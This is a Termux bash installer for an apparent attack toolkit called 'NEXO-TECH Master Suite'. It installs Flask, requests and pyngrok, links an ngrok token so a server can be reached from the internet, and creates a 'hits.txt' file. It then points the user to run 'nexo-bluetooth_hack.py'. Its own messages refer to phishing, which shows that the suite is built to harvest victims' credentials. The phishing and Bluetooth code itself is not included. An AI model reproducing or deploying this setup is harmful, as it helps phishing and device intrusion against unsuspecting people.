#!/data/data/com.termux/files/usr/bin/bash

# --- NEXO-TECH PRO COLORS ---
G='\033[92m'; Y='\033[93m'; C='\033[96m'; R='\033[91m'; W='\033[0m'

echo -e "${C}  _   _  _______   _____    _____ ______ _____ _    _ "
echo -e " | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |"
echo -e " |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |"
echo -e " | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |"
echo -e " | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |"
echo -e " |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_${W}"
echo -e "${G}=======================================================${W}"
echo -e "${Y}[!] TERMUX DEPLOYMENT: NEXO-TECH MASTER SUITE${W}"
echo -e "${G}=======================================================${W}"

# 1. Update and Upgrade Termux
echo -e "\n${C}[*] Updating System Repositories...${W}"
pkg update -y && pkg upgrade -y

# 2. Install Core Dependencies
echo -e "${C}[*] Installing Python, Nano, and API Tools...${W}"
pkg install -y python python-pip nano termux-api ncurses-utils

# 3. Install Python Modules
echo -e "${C}[*] Installing Flask, Requests, and PyNgrok...${W}"
pip install flask requests pyngrok

# 4. Setup Ngrok Configuration
echo -e "\n${Y}[?] Enter your Ngrok Authtoken:${W}"
read -p "Token: " NGROK_TOKEN
if [ ! -z "$NGROK_TOKEN" ]; then
    echo -e "${C}[*] Linking Ngrok Token...${W}"
    ngrok config add-authtoken $NGROK_TOKEN
else
    echo -e "${R}[!] Token skipped. Phishing will require manual entry.${W}"
fi

# 5. Finalize Files
echo -e "${C}[*] Preparing database and permissions...${W}"
touch nexo_database.txt
touch hits.txt
chmod +x nexo-bluetooth_hack.py

echo -e "\n${G}=======================================================${W}"
echo -e "${G}[+] INSTALLATION SUCCESSFUL!${W}"
echo -e "${Y}[*] STEPS TO RUN:${W}"
echo -e "    1. Install 'Termux:API' app from F-Droid (Important for BT)"
echo -e "    2. Run: ${C}python nexo-bluetooth_hack.py${W}"
echo -e "${G}=======================================================${W}"
